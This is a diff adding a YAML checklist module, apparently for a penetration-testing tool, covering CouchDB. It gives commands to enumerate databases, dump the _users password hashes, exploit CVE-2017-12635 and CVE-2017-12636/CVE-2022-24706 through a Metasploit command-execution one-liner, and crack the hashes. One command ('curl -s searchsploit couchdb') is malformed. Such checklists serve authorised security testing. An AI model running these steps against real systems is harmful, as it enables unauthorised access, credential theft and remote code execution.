@@ -1,0 +1,65 @@
+module: couchdb
+name: CouchDB (5984 / 6984)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version (unauth check)
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          curl -s http://$IP:$PORT/
+      - id: stats
+        text: Node config / stats
+        commands: |
+          curl -s http://$IP:$PORT/_node/_local/_stats
+          curl -s http://$IP:$PORT/_utils/
+
+  - id: enum
+    name: Database Enumeration
+    steps:
+      - id: all_dbs
+        text: List all databases
+        commands: |
+          curl -s http://$IP:$PORT/_all_dbs
+      - id: users
+        text: Read the _users DB (accounts / password hashes)
+        commands: |
+          curl -s http://$IP:$PORT/_users/_all_docs?include_docs=true
+      - id: docs
+        text: Dump documents from a database
+        commands: |
+          curl -s "http://$IP:$PORT/<db>/_all_docs?include_docs=true"
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: priv_esc
+        text: CVE-2017-12635 - admin creation via role bypass
+        manual: true
+        commands: |
+          # PUT /_users/org.couchdb.user:hacker with duplicate "roles" keys -> becomes admin
+          curl -s searchsploit couchdb
+      - id: rce
+        text: CVE-2017-12636 / CVE-2022-24706 - config -> RCE (Erlang)
+        manual: true
+        commands: |
+          searchsploit couchdb
+          msfconsole -qx "use exploit/linux/http/apache_couchdb_cmd_exec; set RHOSTS $IP; set RPORT $PORT; run; exit"
+
+  - id: creds
+    name: Authentication
+    authorized: true
+    steps:
+      - id: authed
+        text: Access with credentials
+        commands: |
+          curl -s http://$USER:$PASS@$IP:$PORT/_all_dbs
+      - id: crack
+        text: Crack extracted _users hashes (pbkdf2-sha1)
+        manual: true
+        commands: |
+          # hashcat pbkdf2 (derived_key + salt + iterations from the user doc)
